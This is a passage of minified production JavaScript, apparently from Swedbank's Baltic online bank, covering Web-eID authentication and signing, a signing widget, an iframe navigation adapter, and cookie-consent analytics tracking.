Error("invalid_argument"))):(options&&!options.lang&&(options.lang="en"),_autodetect().then((function(result){return"https:"!==location.protocol&&"file:"!==location.protocol?Promise.reject(new Error("not_allowed")):_backend.getCertificate(options).then((function(certificate){return certificate.hex&&!certificate.encoded&&(certificate.encoded=_hex2array(certificate.hex)),certificate}))})))},fields.sign=function(cert,hash,options){return arguments.length<2?Promise.reject(new Error("invalid_argument")):(options&&!options.lang&&(options.lang="en"),hash.type&&(hash.value||hash.hex)?(hash.hex&&!hash.value&&(_debug("DEPRECATED: hash.hex as argument to sign() is deprecated, use hash.value instead"),hash.value=_hex2array(hash.hex)),hash.value&&!hash.hex&&(hash.hex=function _array2hex(args){for(var ret="",i=0;i<args.length;i++)ret+=(args[i]<16?"0":"")+args[i].toString(16);return ret.toLowerCase()}(hash.value)),_autodetect().then((function(result){return"https:"!==location.protocol&&"file:"!==location.protocol?Promise.reject(new Error("not_allowed")):_backend.sign(cert,hash,options).then((function(signature){return signature.hex&&!signature.value&&(signature.value=_hex2array(signature.hex)),signature}))}))):Promise.reject(new Error("invalid_argument")))},fields.NO_IMPLEMENTATION=NO_IMPLEMENTATION,fields.USER_CANCEL="user_cancel",fields.NOT_ALLOWED="not_allowed",fields.NO_CERTIFICATES="no_certificates",fields.TECHNICAL_ERROR="technical_error",fields.INVALID_ARGUMENT="invalid_argument",fields},webeid=function(exports){var Action;!function(Action){Action.WARNING="web-eid:warning",Action.STATUS="web-eid:status",Action.STATUS_ACK="web-eid:status-ack",Action.STATUS_SUCCESS="web-eid:status-success",Action.STATUS_FAILURE="web-eid:status-failure",Action.AUTHENTICATE="web-eid:authenticate",Action.AUTHENTICATE_ACK="web-eid:authenticate-ack",Action.AUTHENTICATE_SUCCESS="web-eid:authenticate-success",Action.AUTHENTICATE_FAILURE="web-eid:authenticate-failure",Action.GET_SIGNING_CERTIFICATE="web-eid:get-signing-certificate",Action.GET_SIGNING_CERTIFICATE_ACK="web-eid:get-signing-certificate-ack",Action.GET_SIGNING_CERTIFICATE_SUCCESS="web-eid:get-signing-certificate-success",Action.GET_SIGNING_CERTIFICATE_FAILURE="web-eid:get-signing-certificate-failure",Action.SIGN="web-eid:sign",Action.SIGN_ACK="web-eid:sign-ack",Action.SIGN_SUCCESS="web-eid:sign-success",Action.SIGN_FAILURE="web-eid:sign-failure"}(Action||(Action={}));var ErrorCode,Action$1=Action;!function(ErrorCode){ErrorCode.ERR_WEBEID_ACTION_TIMEOUT="ERR_WEBEID_ACTION_TIMEOUT",ErrorCode.ERR_WEBEID_USER_TIMEOUT="ERR_WEBEID_USER_TIMEOUT",ErrorCode.ERR_WEBEID_VERSION_MISMATCH="ERR_WEBEID_VERSION_MISMATCH",ErrorCode.ERR_WEBEID_VERSION_INVALID="ERR_WEBEID_VERSION_INVALID",ErrorCode.ERR_WEBEID_EXTENSION_UNAVAILABLE="ERR_WEBEID_EXTENSION_UNAVAILABLE",ErrorCode.ERR_WEBEID_NATIVE_UNAVAILABLE="ERR_WEBEID_NATIVE_UNAVAILABLE",ErrorCode.ERR_WEBEID_UNKNOWN_ERROR="ERR_WEBEID_UNKNOWN_ERROR",ErrorCode.ERR_WEBEID_CONTEXT_INSECURE="ERR_WEBEID_CONTEXT_INSECURE",ErrorCode.ERR_WEBEID_USER_CANCELLED="ERR_WEBEID_USER_CANCELLED",ErrorCode.ERR_WEBEID_NATIVE_INVALID_ARGUMENT="ERR_WEBEID_NATIVE_INVALID_ARGUMENT",ErrorCode.ERR_WEBEID_NATIVE_FATAL="ERR_WEBEID_NATIVE_FATAL",ErrorCode.ERR_WEBEID_ACTION_PENDING="ERR_WEBEID_ACTION_PENDING",ErrorCode.ERR_WEBEID_MISSING_PARAMETER="ERR_WEBEID_MISSING_PARAMETER"}(ErrorCode||(ErrorCode={}));var ErrorCode$1=ErrorCode;class MissingParameterError extends Error{constructor(message){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_MISSING_PARAMETER}}class ActionPendingError extends Error{constructor(message="same action for Web-eID browser extension is already pending"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_ACTION_PENDING}}class ActionTimeoutError extends Error{constructor(message="extension message timeout"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_ACTION_TIMEOUT}}class ContextInsecureError extends Error{constructor(message="Secure context required, see https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_CONTEXT_INSECURE}}class ExtensionUnavailableError extends Error{constructor(message="Web-eID extension is not available"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_EXTENSION_UNAVAILABLE}}var config=Object.freeze({VERSION:"2.0.1",EXTENSION_HANDSHAKE_TIMEOUT:1e3,NATIVE_APP_HANDSHAKE_TIMEOUT:5e3,DEFAULT_USER_INTERACTION_TIMEOUT:12e4,MAX_EXTENSION_LOAD_DELAY:1e3});class NativeFatalError extends Error{constructor(message="native application terminated with a fatal error"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_NATIVE_FATAL}}class NativeInvalidArgumentError extends Error{constructor(message="native application received an invalid argument"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_NATIVE_INVALID_ARGUMENT}}class NativeUnavailableError extends Error{constructor(message="Web-eID native application is not available"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_NATIVE_UNAVAILABLE}}class UnknownError extends Error{constructor(message="an unknown error occurred"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_UNKNOWN_ERROR}}class UserCancelledError extends Error{constructor(message="request was cancelled by the user"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_USER_CANCELLED}}class UserTimeoutError extends Error{constructor(message="user failed to respond in time"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_USER_TIMEOUT}}class VersionInvalidError extends Error{constructor(message="invalid version string"){super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_VERSION_INVALID}}function tmpl(strings,requiresUpdate){return`Update required for Web-eID ${requiresUpdate}`}class VersionMismatchError extends Error{constructor(message,versions,requiresUpdate){if(message||(requiresUpdate?requiresUpdate.extension&&requiresUpdate.nativeApp?message=tmpl`${"extension and native app"}`:requiresUpdate.extension?message=tmpl`${"extension"}`:requiresUpdate.nativeApp&&(message=tmpl`${"native app"}`):message="requiresUpdate not provided"),super(message),this.name=this.constructor.name,this.code=ErrorCode$1.ERR_WEBEID_VERSION_MISMATCH,this.requiresUpdate=requiresUpdate,versions){const{library:library,extension:extension,nativeApp:nativeApp}=versions;Object.assign(this,{library:library,extension:extension,nativeApp:nativeApp})}}}const errorCodeToErrorClass={[ErrorCode$1.ERR_WEBEID_ACTION_PENDING]:ActionPendingError,[ErrorCode$1.ERR_WEBEID_ACTION_TIMEOUT]:ActionTimeoutError,[ErrorCode$1.ERR_WEBEID_CONTEXT_INSECURE]:ContextInsecureError,[ErrorCode$1.ERR_WEBEID_EXTENSION_UNAVAILABLE]:ExtensionUnavailableError,[ErrorCode$1.ERR_WEBEID_NATIVE_INVALID_ARGUMENT]:NativeInvalidArgumentError,[ErrorCode$1.ERR_WEBEID_NATIVE_FATAL]:NativeFatalError,[ErrorCode$1.ERR_WEBEID_NATIVE_UNAVAILABLE]:NativeUnavailableError,[ErrorCode$1.ERR_WEBEID_USER_CANCELLED]:UserCancelledError,[ErrorCode$1.ERR_WEBEID_USER_TIMEOUT]:UserTimeoutError,[ErrorCode$1.ERR_WEBEID_VERSION_INVALID]:VersionInvalidError,[ErrorCode$1.ERR_WEBEID_VERSION_MISMATCH]:VersionMismatchError};const webExtensionService=new class WebExtensionService{constructor(){this.loggedWarnings=[],this.queue=[],window.addEventListener("message",(event=>this.receive(event)))}receive(event){var _a,_b,_c,_d,_e,_f;if(!/^web-eid:/.test(null===(_a=event.data)||void 0===_a?void 0:_a.action))return;const message=event.data,suffix=null===(_c=null===(_b=message.action)||void 0===_b?void 0:_b.match(/success$|failure$|ack$/))||void 0===_c?void 0:_c[0],initialAction=this.getInitialAction(message.action),pending=this.getPendingMessage(initialAction);if(message.action===Action$1.WARNING)null===(_d=message.warnings)||void 0===_d||_d.forEach((warning=>{this.loggedWarnings.includes(warning)||(this.loggedWarnings.push(warning),console.warn(warning))}));else if(pending)switch(suffix){case"ack":clearTimeout(pending.ackTimer);break;case"success":this.removeFromQueue(initialAction),null===(_e=pending.resolve)||void 0===_e||_e.call(pending,message);break;case"failure":{const failureMessage=message;this.removeFromQueue(initialAction),null===(_f=pending.reject)||void 0===_f||_f.call(pending,failureMessage.error?function deserializeError(errorObject){let error;error="string"==typeof errorObject.code&&errorObject.code in errorCodeToErrorClass?new(0,errorCodeToErrorClass[errorObject.code]):new UnknownError;for(const[key,value]of Object.entries(errorObject))error[key]=value;return error}(failureMessage.error):failureMessage);break}}}send(message,timeout){if(this.getPendingMessage(message.action))return Promise.reject(new ActionPendingError);if(window.isSecureContext){const pending={message:message};return this.queue.push(pending),pending.promise=new Promise(((resolve,reject)=>{pending.resolve=resolve,pending.reject=reject})),pending.ackTimer=window.setTimeout((()=>this.onAckTimeout(pending)),config.EXTENSION_HANDSHAKE_TIMEOUT),pending.replyTimer=window.setTimeout((()=>this.onReplyTimeout(pending)),timeout),window.postMessage(message,"*"),pending.promise}return Promise.reject(new ContextInsecureError)}onReplyTimeout(pending){var _a;this.removeFromQueue(pending.message.action),null===(_a=pending.reject)||void 0===_a||_a.call(pending,new ActionTimeoutError)}onAckTimeout(pending){var _a;clearTimeout(pending.replyTimer),this.removeFromQueue(pending.message.action),null===(_a=pending.reject)||void 0===_a||_a.call(pending,new ExtensionUnavailableError)}getPendingMessage(action){return this.queue.find((pm=>pm.message.action===action))}getInitialAction(action){return action.replace(/-success$|-failure$|-ack$/,"")}removeFromQueue(action){const pending=this.getPendingMessage(action);clearTimeout(null==pending?void 0:pending.replyTimer),this.queue=this.queue.filter((pending=>pending.message.action!==action))}},initializationTime=+new Date;async function extensionLoadDelay(){const now=+new Date;await function sleep(milliseconds){return new Promise((resolve=>{setTimeout((()=>resolve()),milliseconds)}))}(initializationTime+config.MAX_EXTENSION_LOAD_DELAY-now)}return exports.Action=Action$1,exports.ErrorCode=ErrorCode$1,exports.authenticate=async function authenticate(challengeNonce,options){if(await extensionLoadDelay(),!challengeNonce)throw new MissingParameterError("authenticate function requires a challengeNonce");const timeout=config.EXTENSION_HANDSHAKE_TIMEOUT+config.NATIVE_APP_HANDSHAKE_TIMEOUT+((null==options?void 0:options.userInteractionTimeout)||config.DEFAULT_USER_INTERACTION_TIMEOUT),message={action:Action$1.AUTHENTICATE,libraryVersion:config.VERSION,challengeNonce:challengeNonce,options:options},{unverifiedCertificate:unverifiedCertificate,algorithm:algorithm,signature:signature,format:format,appVersion:appVersion}=await webExtensionService.send(message,timeout);return{unverifiedCertificate:unverifiedCertificate,algorithm:algorithm,signature:signature,format:format,appVersion:appVersion}},exports.config=config,exports.getSigningCertificate=async function getSigningCertificate(options){await extensionLoadDelay();const timeout=config.EXTENSION_HANDSHAKE_TIMEOUT+config.NATIVE_APP_HANDSHAKE_TIMEOUT+2*((null==options?void 0:options.userInteractionTimeout)||config.DEFAULT_USER_INTERACTION_TIMEOUT),message={action:Action$1.GET_SIGNING_CERTIFICATE,libraryVersion:config.VERSION,options:options},{certificate:certificate,supportedSignatureAlgorithms:supportedSignatureAlgorithms}=await webExtensionService.send(message,timeout);return{certificate:certificate,supportedSignatureAlgorithms:supportedSignatureAlgorithms}},exports.sign=async function sign(certificate,hash,hashFunction,options){if(await extensionLoadDelay(),!certificate)throw new MissingParameterError("sign function requires a certificate as parameter");if(!hash)throw new MissingParameterError("sign function requires a hash as parameter");if(!hashFunction)throw new MissingParameterError("sign function requires a hashFunction as parameter");const timeout=config.EXTENSION_HANDSHAKE_TIMEOUT+config.NATIVE_APP_HANDSHAKE_TIMEOUT+2*((null==options?void 0:options.userInteractionTimeout)||config.DEFAULT_USER_INTERACTION_TIMEOUT),message={action:Action$1.SIGN,libraryVersion:config.VERSION,certificate:certificate,hash:hash,hashFunction:hashFunction,options:options},{signature:signature,signatureAlgorithm:signatureAlgorithm}=await webExtensionService.send(message,timeout);return{signature:signature,signatureAlgorithm:signatureAlgorithm}},exports.status=async function status(){await extensionLoadDelay();const timeout=config.EXTENSION_HANDSHAKE_TIMEOUT+config.NATIVE_APP_HANDSHAKE_TIMEOUT,message={action:Action$1.STATUS,libraryVersion:config.VERSION};try{const{library:library,extension:extension,nativeApp:nativeApp}=await webExtensionService.send(message,timeout);return{library:library,extension:extension,nativeApp:nativeApp}}catch(error){throw error.library=config.VERSION,error}},Object.defineProperty(exports,"__esModule",{value:!0}),exports}({}),Swedbank=Swedbank||{};function handleVaNavigation(){Swedbank.FDPAdapter.getInstance().handleNavigation();const chatBox=document.querySelector("va-chatbox");chatBox&&chatBox.handleNavigationUpdate()}Swedbank.SigningWidget=class extends SharedComponents.UIElement{static get props(){return{children:{view:"ui-signing"}}}get singingService(){return Swedbank.SigningService.get()}get restService(){return Swedbank.RestService.get()}sign(customLabels,customParams){this.view.setAttributes(Object.assign({error:null,"error-actions":null,"label-cancel":SharedComponents.UISigning.labels.CANCEL_BUTTON_LABEL},customLabels||{})),this.singingService.runSingingProcess(this.handleSigningInit.bind(this),this.handleSigningProceed.bind(this),this.handleSigningComplete.bind(this),this.handleSigningFailure.bind(this),customParams)}destroyView(){return this.runTransition({"-fade-out":!0,"-slide-out":!0},500).then((()=>{this.hide(),this.view.setAttributes({code:null,error:null,"error-actions":null})}))}buildView(){return this.show(),this.runTransition({"-fade-in":!0,"-slide-in":!0},500)}handleSigningCancel(e){this.singingService.cancel(),this.handleSigningCanceled({})}handleSigningCanceled(response){this.singingService.signingInProgress=!1,this.destroyView().then((()=>{this.dispatchCustomEvent("signing-canceled",response)}))}handleSigningComplete(params){this.singingService.signingInProgress=!1,this.destroyView().then((()=>{params&&params.canceled?this.dispatchCustomEvent("signing-canceled",{}):this.dispatchCustomEvent("signing-completed",params)}))}handleSigningConfirm(){let signingService=this.singingService;if(signingService.signingInProgress)return;signingService.signingInProgress=!0;const confirmButton=this.view.querySelector("[name=ui-signing-confirm]");confirmButton.disabled=!0;const params={signingCode:this.view.querySelector("input[name=signing-value]").value};let signingWidget=this;const signingPromise=signingService.confirmCode(params).then((result=>{if("wait"===result.status){(signingWidget._signingMethod?Promise.resolve(signingWidget._signingMethod):signingService.getSigningMethod()).then((function(signingMethod){var actualRequestId=performance.now();signingService.actualRequestId=actualRequestId,signingService.setPolSessionCode("1"),signingService.buildPollingHandler(signingMethod.method,(()=>{}),signingWidget.handleSigningComplete,signingWidget.handleSigningFailure,{},actualRequestId).call()}))}else this.handleSigningFailure(result)})).catch((error=>{this.handleSigningFailure(error)}));return UI.runWithLockingForm(signingPromise,confirmButton,this.view).then((()=>{confirmButton.disabled=!0}))}handleSigningFailure(error){this.singingService.signingInProgress=!1,this.view.isMethodSupported(this._signingMethod.method)?this.singingService.isCertificate(this._signingMethod.method)?Swedbank.CryptoService.get().getService().then((service=>service.getError(error))).then((errorMessage=>{this.view.setAttributes({error:"error","error-actions":"error-actions","error-status":errorMessage,trusted:"trusted"})})):this.view.setAttributes({error:"error","error-actions":"error-actions","error-status":(error instanceof Error?null:error.message)||null,trusted:null}):this.dispatchCustomEvent("signing-failed",error)}resolveButtonLabel(method){let key;switch(String(method)){case"SMART_ID_Q":case"SMART_ID_NQ":key="SMART_ID";break;case"PIN_CALCULATOR":case"ADVANCED_PIN_CALCULATOR":key="DIGIPASS";break;default:key=method}return SharedComponents.UISigning.labels[key+"_BUTTON_LABEL"]}resolveSignAction(){return(this._signingMethod?Promise.resolve(this._signingMethod):this.singingService.getSigningMethod()).then((signingMethod=>{const label=this.resolveButtonLabel(signingMethod.method);return label?{id:"SIGN",label:label,disabled:!1}:null}))}handleSigningInit(config){this._signingMethod=config.signingMethod,this.view.isMethodSupported(this._signingMethod.method)&&this._signingMethod.confirmationRequired?(this.view.setAttributes({method:this._signingMethod.method,"label-running":!1,"label-code":config.title||null,"label-intro":config.status||null}),[].forEach.call(this.view.querySelectorAll("input, button"),(node=>{node.removeAttribute("disabled")})),this.dispatchCustomEvent("signing-initiated",{hideActions:!0}),this.buildView()):this.dispatchCustomEvent("signing-initiated",{hideActions:!1})}handleSigningProceed(config){this.view.isMethodSupported(config.method)&&(config.id&&this.view.setAttributes({code:config.id,"label-cancel":SharedComponents.UISigning.labels.CANCEL_BUTTON_LABEL,"label-confirm":this.singingService.isDigipass(config.method)?SharedComponents.UISigning.labels.DIGIPASS_CONFIRM:null}),this.singingService.isDigipass(config.method)&&(this.singingService.signingInProgress=!1))}render(){this.insertElements([{tagName:"ui-signing",classList:{"-frame-footer":!0}}])}hydrate(){this.handleSigningConfirm=this.handleSigningConfirm.bind(this),this.handleSigningComplete=this.handleSigningComplete.bind(this),this.handleSigningFailure=this.handleSigningFailure.bind(this),this.handleSigningCancel=this.handleSigningCancel.bind(this),this.view.addEventListener("confirm",this.handleSigningConfirm),this.view.addEventListener("cancel",this.handleSigningCancel)}},Swedbank.SigningWidget.defineElement("signing-widget"),Swedbank.FDPAdapter=class{static get messageTypes(){return{Navigation:"NAVIGATION",Initial:"INITIAL",HeightChanged:"HEIGHT_CHANGED",ModalClosed:"MODAL_CLOSED",ModalOpened:"MODAL_OPENED",OverlayOpened:"OVERLAY_OPENED",OverlayClosed:"OVERLAY_CLOSED",Click:"CLICK"}}static getInstance(){return this._instance||(this._instance=new Swedbank.FDPAdapter),this._instance}static isFDPEnabled(){return!Swedbank.isProduction&&window.parent!==window}handleNavigation(){if(!this.constructor.isFDPEnabled())return;let currentUrl=null;Swedbank.Navigation.url!==currentUrl&&(currentUrl=Swedbank.Navigation.url,this.postToParentApp({type:this.constructor.messageTypes.Navigation,payload:{url:this.makeURLFDPFriendly(currentUrl),title:document.title,meta:this.getMetaDefinitions()}})),window.addEventListener("message",(event=>{if(event.data.type!==this.constructor.messageTypes.Navigation)return;const nextUrl=event.data.payload?.url||"";if(!nextUrl)return void Swedbank.warn(`PostMessage URL is empty or incorrect: '${nextUrl}'`);const pageId=this.makeURLIbankFriendly(nextUrl);if(event.data.type===this.constructor.messageTypes.Navigation)this.navigate(pageId)}))}navigate(pageId){pageId!==Swedbank.Navigation.pageId&&linkAction(pageId)}makeURLIbankFriendly(url=""){return url.replace(/\//,"").replace(/\//g,".")}makeURLFDPFriendly(url=""){return window.location.origin+url.replace(Swedbank.Navigation.sessionIdPattern,"")}postToParentApp(data,origin="*"){if(!this.constructor.isFDPEnabled())return;const sendMessage=()=>window.parent.postMessage(data,origin);Swedbank.isUiSpaEnabled?sendMessage():Swedbank.PageLoad.onEach(sendMessage)}getMetaDefinitions(){return[].filter.call(document.querySelectorAll("meta"),(m=>"text/html; charset=utf-8"!==m.content.toLowerCase())).map((m=>UI.getAttributes(m)))}static prepare(){if(!this.isFDPEnabled())return;if(!document.querySelector("ui-iframe-controller")){const iframeController=UI.createElement({tagName:"ui-iframe-controller",attributes:{"root-selector":".page-content__wrapper"}});document.body.append(iframeController)}const anchor=document.querySelector("ui-anchor");UI.hide(anchor)}},UI.whenDOMReady((()=>{Swedbank.isAuthenticated||setTimeout((()=>window.location.reload()),54e5),SharedComponents.UIOffer.registerPlugin("lazy-loading",SharedComponents.LazyLoadingPlugin,!0),SharedComponents.UIVideo.registerPlugin("lazy-loading",SharedComponents.LazyLoadingPlugin,!0),SharedComponents.UICard.registerPlugin("lazy-loading",SharedComponents.LazyLoadingPlugin,!0),SharedComponents.UIAward.registerPlugin("lazy-loading",SharedComponents.LazyLoadingPlugin,!0),SharedComponents.UIAwardDetails.registerPlugin("lazy-loading",SharedComponents.LazyLoadingPlugin,!0),SharedComponents.UIColumn.registerPlugin("lazy-loading",SharedComponents.LazyLoadingPlugin,!0),SharedComponents.UIProduct.registerPlugin("lazy-loading",SharedComponents.LazyLoadingPlugin,!0);const init=()=>{const activatableElementsSelector=[":target",'ui-navtoggle[for="'+Swedbank.Navigation.getHash()+'"]'],hashObject=Swedbank.Navigation.parseHash(),target=document.querySelector(activatableElementsSelector.join(","));target?Swedbank.Navigation.activateTarget(target,100):hashObject&&Object.keys(hashObject).forEach((key=>{const elem=document.getElementById(hashObject[key]);elem&&Swedbank.Navigation.activateTarget(elem,100)})),Swedbank.isForceLogout&&Swedbank.UIModals.open("notificationPanel");const anchor=String(location.hash).substring(1),el=document.getElementById(anchor),y=el?el.offsetTop:0;window.scrollTo(0,y);const hashTarget=document.getElementById(Swedbank.Navigation.getHash());hashTarget&&Swedbank.Navigation.activateTarget(hashTarget,100);const spoeBar=document.querySelector("spoe-bar");if(spoeBar&&spoeBar.rebuildSPOEBar(),resolveGlobalFormValidator(),Swedbank.Time.showDateSensitiveContent(),!Swedbank.isProduction){const theme=UI.getTheme();theme&&UI.setTheme(theme)}Swedbank.FDPAdapter.prepare()};SharedComponents.eventBus.addEventListener("spa-navigation-start",(event=>{Swedbank.PageConfig={},event.detail.to.includes(".search")||Swedbank.Search.getSearchElement().deactivate()})),SharedComponents.eventBus.addEventListener("spa-navigation-complete",init),init(),SharedComponents.UIPhoneField.setRules(Swedbank.country.toLowerCase())})),Swedbank.isUiSpaEnabled?SharedComponents.eventBus.addEventListener("spa-navigation-complete",handleVaNavigation):Swedbank.PageLoad.onEach(handleVaNavigation),window.addEventListener("popstate",handleVaNavigation),Swedbank.UICookieConsentAnalytics=class{constructor(target){switch(this.target=target,this.baseUrl="https://swedbankab.d3.sc.omtrdc.net/b/ss/"+(Swedbank.isProduction&&window.location.hostname.match(/^(www\.?)?swedbank\.(ee|lv|lt)$/)?"swedbankabbballcookieprod":"swedbankabbballcookiedev")+"/1/JS-2.9.0/",this.trackingObject={pccr:"true",pageName:"web"+Swedbank.Navigation.getBasePath(),g:window.location.origin+Swedbank.Navigation.getBasePath(),r:Swedbank.Navigation.removeSessionId(Swedbank.Navigation.referrer),v1:"D=pageName",c57:"D=g",v57:"D=g",c58:"D=r",mcorgid:"AB12899B544ABE260A4C98BC@AdobeOrg",events:"event216",v139:"cookieconsent",pe:"lnk_o",pev2:"cookieConsentView",v97:Swedbank.country.toLowerCase(),v6:Swedbank.language.toLowerCase(),v0:Swedbank.AdobeTracking.getURLParamByName("cid")||Swedbank.AdobeTracking.getURLParamByName("WT.mc_id")||"",v76:Swedbank.AdobeTracking.getURLParamByName("WT.seg_4").replace(/.html/g,""),v90:Swedbank.AdobeTracking.getURLParamByName("SW.link")},Swedbank.country){case"EE":this.trackingObject.v7="0010";break;case"LV":this.trackingObject.v7="0110";break;case"LT":this.trackingObject.v7="0210"}this.trackingImage=this.target.createElement({tagName:"img",attributes:{alt:"",hidden:"hidden"}})}hasAnalyticsAccepted(){return this.target.getSelectedCategories()[SharedComponents.UICookieConsent.categories.ANALYTICAL]===SharedComponents.UICookieConsent.CATEGORY_ALLOWED}hasTargetingAccepted(){return this.target.getSelectedCategories()[SharedComponents.UICookieConsent.categories.TARGETING]===SharedComponents.UICookieConsent.CATEGORY_ALLOWED}_buildTrackingUrl(){return this.baseUrl+"?"+SharedComponents.helpers.buildQueryString(this.trackingObject)}trackWithImage(params){"true"!==Swedbank.sessionStorage.get("UI_TEST")&&(Object.assign(this.trackingObject,params||{}),this.trackingImage.setAttribute("src",this._buildTrackingUrl()))}trackingClickHandler(params){Object.assign(this.trackingObject,{v74:"cookieconsent",events:"event146",pev2:"click"}),delete this.trackingObject.v0,delete this.trackingObject.v76,delete this.trackingObject.v90,this.trackWithImage(params||{})}render(){this.target.declineButton.dataset.wtLabel="Decline",this.target.acceptButton.dataset.wtLabel="Accept",this.target.saveChoiceButton.dataset.wtLabel="Save my choice",this.target.settings.wtLabel="Select your own cookies";const policyLinks=this.target.querySelectorAll(".ui-cookie-consent__about-cookie-link");[].forEach.call(policyLinks,(function(link){link.dataset.wtLabel="Cookie Policy"}))}hydrate(){if(this.hasAnalyticsAccepted())return;this.target.insertAdjacentElement("afterend",this.trackingImage),Swedbank.sessionStorage.get("cookie-first")||(this.trackWithImage({}),Swedbank.sessionStorage.set("cookie-first","true")),this.target.acceptButton.addEventListener("click",this.trackingClickHandler.bind(this,{v73:"button",v23:"accept-all"})),this.target.saveChoiceButton.addEventListener("click",this.trackingClickHandler.bind(this,{v73:"button",v23:"save-my-preferences"})),this.target.declineButton.addEventListener("click",this.trackingClickHandler.bind(this,{v73:"button",v23:"decline-cookie-preferences"}));this.target.querySelector(".ui-cookie-consent__policy-link").addEventListener("click",this.trackingClickHandler.bind(this,{v73:"link",v23:"cookie-principles"}));this.target.querySelector(".ui-cookie-consent__entities-link").addEventListener("click",this.trackingClickHandler.bind(this,{v73:"link",v23:"swedbank-entities"}));this.target.querySelector(".ui-cookie-consent__cookie-link").addEventListener("click",this.trackingClickHandler.bind(this,{v73:"link",v23:"cookie-list"}));const analyticalCheckbox=document.getElementById("cookie-consent-category-"+SharedComponents.UICookieConsent.categories.ANALYTICAL),targetingCheckbox=document.getElementById("cookie-consent-category-"+SharedComponents.UICookieConsent.categories.TARGETING);analyticalCheckbox&&analyticalCheckbox.addEventListener("change",this.trackingClickHandler.bind(this,{v73:"checkbox",v23:"analytical-cookies"})),targetingCheckbox&&targetingCheckbox.addEventListener("change",this.trackingClickHandler.bind(this,{v73:"checkbox",v23:"targeting-cookies"}))}},SharedComponents.UICookieConsent.registerPlugin("analytics",Swedbank.UICookieConsentAnalytics,!0);var UISigningAnalytics=function(){function UISigningAnalytics(target){this.target=target}return UISigningAnalytics.prototype.render=function(){var cancelButton=this.target.querySelector('button[name="ui-signing-cancel"]'),signingButton=this.target.querySelector('button[name="ui-signing-confirm"]');cancelButton&&this.target.updateElement.call(cancelButton,{attributes:{"data-wt-label":"Cancel"}}),signingButton&&this.target.updateElement.call(signingButton,{attributes:{"data-wt-label":"Confirm"}})},UISigningAnalytics.prototype.hydrate=function(){},UISigningAnalytics}();SharedComponents.UISigning.registerPlugin("analytics",UISigningAnalytics,!0);var UITooltipExternalHandler=function(UITooltip){function UITooltipExternalHandler(target){this.target=target}return UITooltipExternalHandler.prototype.render=function(){},UITooltipExternalHandler.prototype._ajaxHelpHandler=function(event){var tooltip=event.currentTarget,params={pageId:"help.smallhelp",labelId:event.currentTarget.getAttribute("help-id"),helpId:Swedbank.Navigation.pageId},content=tooltip.popoverElement.querySelector(".ui-tooltip__content"),loader=this._getLoader();null!=content&&(content.appendChild(loader),tooltip.setAttribute("aria-busy","true"),(new Swedbank.RestService).performRequest(params).then(function(response){content.innerHTML=response,tooltip.removeEventListener("modal-open",this._ajaxHelpHandler),tooltip.removeAttribute("aria-busy")}.bind(this)))},UITooltipExternalHandler.prototype._getLoader=function(){var loader=this.target.querySelector(".ui-tooltip__loader");return loader||this.target.createElement({tagName:"ui-icon",attributes:{glyph:"loader"},classList:{"ui-tooltip__loader":!0}})},UITooltipExternalHandler.prototype.hydrate=function(){this._ajaxHelpHandler=this._ajaxHelpHandler.bind(this);var tooltip=this.target;tooltip.getAttribute("help-id")&&tooltip.addEventListener("modal-open",this._ajaxHelpHandler)},UITooltipExternalHandler}(SharedComponents.UITooltip);SharedComponents.UITooltip.registerPlugin("openExternal",UITooltipExternalHandler,!0),Swedbank.UIWebinarRegistration=class extends SharedComponents.UIElement{static get props(){return{attributes:{form:{name:"form",type:String}},children:{content:{selector:"ui-offer"}}}}static get TEMPLATES(){return{GOLD:{EE:684,LV:4477,LT:4475},PRIVATE_BANKING:{EE:685,LV:4478,LT:4476},1:{EE:686,LV:4479,LT:4477},2:{EE:687,LV:4480,LT:4478}}}static get vip(){return"vip"}static get minAge(){return 18}get offersHelper(){return Swedbank.OffersHelper||{}}get segment(){return this.offersHelper.customerSegment||""}get age(){return this.offersHelper.customerAge||0}get isVip(){return this.segment===Swedbank.UIWebinarRegistration.vip}get allowedAge(){return this.age>=Swedbank.UIWebinarRegistration.minAge}get templateId(){return Swedbank.UIWebinarRegistration.TEMPLATES[this.form][Swedbank.country]||null}get restService(){return Swedbank.RestService.get()}get sendButton(){return this.content.querySelector('button[type="button"]:not(.-destructive)')}sendData(){const environment=Swedbank.Navigation.isPrivate()?"private":"business",params={[document.mainForm.action.replace(/^[^;]+(;.*)$/,`/${environment}$1`)]:!0,control:!0,pageId:`${environment}.mail.sender`,templateId:this.templateId,coreId:Swedbank.isAuthenticated?Swedbank.User.currentCustomerId:""};this.restService.performRequest(params).then((response=>{response&&!response.data?this.rebuildChildren([UI.html`<h2>${response.answer}</h2>`]):this.errorHandler(response)})).catch((error=>this.errorHandler(error)))}errorHandler(error){this.rebuildChildren([UI.html`<ui-message type="error">${error.data.exception}</ui-message>`])}hydrate(){if(Swedbank.isAuthenticated&&this.form&&this.templateId&&!this.isVip&&this.allowedAge)this.sendButton.addEventListener("click",(()=>this.sendData()));else{const parent=this.parentElement;this.remove(),parent&&!parent.children.length&&parent.remove()}}},Swedbank.UIWebinarRegistration.defineElement("ui-webinar-registration");class UIDropdownCountryFiller{constructor(target){this.target=target}_buildCountryOption(country){return UI.createElement({tagName:"option",attributes:{"data-text":country.name,"data-flag":country.iso2,value:`+${country.dialCode}`,selected:Swedbank.country===country.iso2.toUpperCase()||null,"aria-label":country.name},children:[country.name]})}static sortByBalticRegion(countriesList){const order=["ee","lv","lt","ru","fi","se"];order.reverse(),order.forEach((x=>{const country=countriesList.find((c=>c.dataset.flag===x)),countryIndex=countriesList.indexOf(country);countriesList.splice(countryIndex,1),countriesList.unshift(country)}))}render(){Swedbank.Countries.fetch().then((countries=>{const 